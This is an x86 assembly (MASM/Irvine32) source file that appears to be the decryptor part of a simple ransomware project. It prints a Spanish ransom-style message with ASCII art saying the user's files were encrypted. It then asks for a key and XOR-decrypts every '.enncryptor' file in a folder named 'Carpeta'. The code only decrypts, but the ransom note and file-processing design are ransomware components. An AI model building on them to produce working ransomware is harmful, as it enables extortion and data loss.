INCLUDE Irvine32.inc

BUFFER_SIZE = 700000
KEY_SIZE = 30

.data
   FDC WIN32_FIND_DATA <>             ;Define File Descriptor
   file_extension db '*.enncryptor', 0
   PathName        db 'Carpeta',0  
   Currentdire     db 'SetCurrentDirectory("Carpeta")',0
   find_handle     dd 0   
   key	   BYTE KEY_SIZE DUP(?)
   buffer BYTE BUFFER_SIZE DUP(?)
 ;  Buffer          = byte ptr -18h
   ofileHandle   HANDLE ?
   stringLength DWORD ?
   Err1         db 'Asegurese que el directorio CARPETA se encuentra presente,con todos los archivos cerrados y con atributos de escritura.',0Ah,0
   Err2         db "Error al leer archivo"
iMsg  db '     .... NO! ...                  ... MNO! ...',0Ah
db '   ..... MNO!! ...................... MNNOO! ...',0Ah
db ' ..... MMNO! ......................... MNNOO!! .',0Ah
db '..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .',0Ah
db ' ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....',0Ah
db '    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...',0Ah
db '   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....',0Ah
db '  ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...',0Ah
db '    ....... MMMMM..    OPPMMP    .,OMI! ....',0Ah
db '     ...... MMMM::   o.,OPMP,.o   ::I!! ...',0Ah
db '         .... NNM:::.,,OOPM!P,.::::!! ....',0Ah
db '          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....',0Ah
db '         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....',0Ah
db '           .. MMMMMNNOOMMNNIIIPPPOO!! ......',0Ah
db '          ...... MMMONNMMNNNIIIOO!..........',0Ah
db '       ....... MN MOMMMNNNIIIIIO! OO ..........',0Ah
db '    ......... MNO! IiiiiiiiiiiiI OOOO ...........',0Ah
db '  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........',0Ah
db '   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........',0Ah
db '   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........',0Ah
db '      ...... OO! ................. ON! .......',0Ah
db '         ................................',0Ah
db '                              ',0Ah
db 'Tus documentos, fotos, y otros importantes archivos fueron cifrad'
db 'os con un algoritmo muy fuerte.               ',0Ah
db 'Utiliza este desencriptor para recuperar tus archivos            '
db '                                                                 ',0Ah
db '                              ',0Ah
db 'Enter the decryption key and press Enter: ',0

iMsgBW BYTE "Bytes written to file: ",0
Filler BYTE " ",0
fileLength DWORD ? 
filename     BYTE 100 DUP(?)
fileHandle   HANDLE ?
bytesWritten DWORD ?
buffersize DWORD ?
.code rw
main PROC

inicio:
mov  edx,OFFSET iMsg
call WriteString
    call enter_key
set_directoy:
    invoke SetCurrentDirectory,  offset PathName ; find the Path
    test    eax, eax
    jz     NoSetPath
    
explore_directoy:
    invoke FindFirstFile,  offset file_extension,  offset FDC  ; find the first
    mov [find_handle], eax

find_more_files:
    cmp eax, 0
    je QuitNow
    call proc_file

findnext_file:
    invoke FindNextFile,  find_handle, offset FDC
    jmp find_more_files

proc_file:
;mov  edx,OFFSET FDC.cFileName
;call WriteString
call open_file
call Enc_xor
call save_file
ret

enter_key:
	mov	ecx,KEY_SIZE
	mov	edx,OFFSET key
	call	ReadString
ret

open_file:
	mov	edx,OFFSET FDC.cFileName
	call	OpenInputFile
	mov	ofileHandle,eax
	cmp	eax,INVALID_HANDLE_VALUE
	jne	file_ok	
    mov  edx,OFFSET Err1
    call WriteString
    exit
			
file_ok:
; Read the file into a buffer.
	mov	edx,OFFSET buffer
	mov	ecx,BUFFER_SIZE
	call	ReadFromFile
	mov	stringLength,eax		; counts chars entered
    mov buffersize, eax

close_file:
	mov	eax,ofileHandle
	call	CloseFile
    ret


save_file:
;*************************************** Create a new text file. ; tamaño del string en offset edi, lo entrega en eax
    mov edi, OFFSET FDC.cFileName
    mov eax,0                            ; cuenta de caracteres
L1: cmp BYTE PTR[edi],0                  ; ¿final de la cadena?
    je  L2                               ; sí: termina
    inc edi                              ; no: apunta al siguiente
    inc eax                              ; suma 1 a la cuenta
    jmp L1
L2: mov fileLength, eax
Copia_Str:                               ;copia cadenas
    sub eax,11                           ; resto 11 caracteres del .enncryptor
    mov ecx,eax                          ; cuenta de REP
    inc ecx         	                 ; suma 1 por el byte nulo
    mov esi,OFFSET FDC.cFileName
    mov edi,OFFSET FileName 
    cld 	                             ; dirección = avance
    rep movsb 			                 ; copia la cadena
;***************************************************crea archivo con nuevo nombre sin extension enncr
	mov	edx,OFFSET FileName              ; Cambiar por el nuevo nombre
	call	CreateOutputFile
	mov	fileHandle,eax
	mov	edx,OFFSET buffer
	mov	ecx,stringLength
    call	WriteToFile
    mov	bytesWritten,eax
	call	CloseFile
;*************************************** Print Bytes Writing
    mov  eax,bytesWritten
    call	WriteDec
    mov  edx,OFFSET filler
    call WriteString
    mov  edx,OFFSET iMsgBW
    call WriteString
    mov  edx,OFFSET FileName ; Cambiar por el nuevo nombre
    call WriteString
    call	Crlf
;**************************************** Clear Name
    xor ecx, ecx
    xor eax, eax
    lea edi, filename
    mov ecx, fileLength
    cld
    rep stosw 
    ret

Enc_xor:
    pushad
    xor edx,edx 
xor_l1:
;*******************************************Rutina de encode 
   cmp  edx,buffersize
   jge     xor_end
   xor     ecx, ecx
   mov esi, offset key
   mov edi, offset buffer
xor_l2:
	cmp   cl, 8
	jge   xor_l1
	mov   bl, [ecx+esi]
	mov   al, [edx+edi] ;buffer
    xor   al,bl
    rol   al,cl 
	sub   al,cl
	mov   [edx+edi], al
	inc   cl
    inc   edx
	jmp   xor_l2
xor_end: 
    popad
    ret


NoSetPath:
mov  edx,OFFSET Err1
call WriteString
QuitNow:
exit
main ENDP
END main
